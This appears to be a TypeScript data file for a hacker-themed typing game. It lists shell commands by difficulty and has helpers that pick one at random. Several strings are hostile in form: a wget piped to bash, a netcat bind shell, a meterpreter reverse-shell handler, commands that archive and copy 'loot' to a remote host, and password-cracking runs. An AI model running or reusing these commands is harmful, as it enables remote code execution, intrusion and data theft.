/**
 * Typing Challenge Commands
 * ==========================
 * Library of hacker-themed commands for the typing game
 */

// ════════════════════════════════════════════════════════════════
// COMMAND CATEGORIES
// ════════════════════════════════════════════════════════════════

/** Short commands (easy difficulty) */
export const EASY_COMMANDS = [
	'whoami && id && pwd',
	'ls -la /home/ghost',
	'cat /etc/passwd | grep root',
	'ping -c 4 ghostnet.io',
	'ssh ghost@localhost',
	'netstat -tulpn',
	'ps aux | grep node',
	'df -h /dev/sda1',
	'chmod 755 exploit.sh',
	'curl -I https://api.ghost',
	'nslookup ghostnet.io',
	'traceroute darknet.io',
	'uptime && free -m',
	'echo $PATH | tr : "\\n"',
	'history | tail -20'
];

/** Medium length commands */
export const MEDIUM_COMMANDS = [
	'ssh -L 8080:localhost:443 ghost@proxy.darknet.io',
	'nmap -sS -sV -p- --script vuln target.subnet',
	'curl -X POST -H "Auth: Bearer token" https://api.ghost/extract',
	'nc -lvnp 4444 -e /bin/bash',
	'tcpdump -i eth0 -w capture.pcap host 192.168.1.1',
	'openssl enc -aes-256-cbc -salt -in data.bin -out cipher.enc',
	'gpg --encrypt --recipient ghost@net --armor payload.dat',
	'sudo iptables -A INPUT -s 0.0.0.0/0 -j DROP',
	'find / -perm -4000 -type f 2>/dev/null',
	'tar -czvf payload.tar.gz ./loot && scp payload.tar.gz ghost:/out',
	'base64 -d encoded.txt | gunzip > decoded.bin',
	'wget -q -O - https://ghostnet.io/inject | bash',
	'docker run -d --rm -p 8080:80 ghostnet/proxy:latest',
	'git clone --depth 1 git@ghost:exploit/zero-day.git',
	'python3 -c "import socket; s=socket.socket(); s.connect((host,port))"'
];

/** Long/complex commands (hard difficulty) */
export const HARD_COMMANDS = [
	'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j"',
	'sqlmap -u "target.io/id=1" --dump --batch --level=5 --risk=3 --threads=10',
	'nikto -h https://target.io -ssl -output scan.txt -Format htm -Tuning 123bde',
	'hashcat -m 1000 -a 0 --force -O ntlm.hash /usr/share/wordlists/rockyou.txt',
	'rsync -avz --progress --exclude="*.log" /vault/data ghost@exit:/extracted/',
	'ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.io/FUZZ -mc 200,301,302',
	'john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 shadow.txt',
	'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1 -t 4 -V',
	'wpscan --url https://target.io --enumerate u,vp,vt --api-token $WP_TOKEN',
	'gobuster dir -u https://target.io -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html'
];

/** All commands combined */
export const TYPING_COMMANDS = [
	...EASY_COMMANDS,
	...MEDIUM_COMMANDS,
	...HARD_COMMANDS
];

// ════════════════════════════════════════════════════════════════
// HELPERS
// ════════════════════════════════════════════════════════════════

/** Get a random command of specified difficulty */
export function getRandomCommand(difficulty?: 'easy' | 'medium' | 'hard'): string {
	let pool: string[];
	
	switch (difficulty) {
		case 'easy':
			pool = EASY_COMMANDS;
			break;
		case 'medium':
			pool = MEDIUM_COMMANDS;
			break;
		case 'hard':
			pool = HARD_COMMANDS;
			break;
		default:
			pool = TYPING_COMMANDS;
	}
	
	return pool[Math.floor(Math.random() * pool.length)];
}

/** Determine difficulty based on command length */
export function getCommandDifficulty(command: string): 'easy' | 'medium' | 'hard' {
	if (command.length < 30) return 'easy';
	if (command.length < 70) return 'medium';
	return 'hard';
}

/** Get reward multiplier based on difficulty */
export function getDifficultyReward(difficulty: 'easy' | 'medium' | 'hard'): {
	deathRateReduction: number;
	label: string;
} {
	switch (difficulty) {
		case 'easy':
			return { deathRateReduction: 0.05, label: '-5% Death Rate' };
		case 'medium':
			return { deathRateReduction: 0.10, label: '-10% Death Rate' };
		case 'hard':
			return { deathRateReduction: 0.15, label: '-15% Death Rate' };
	}
}
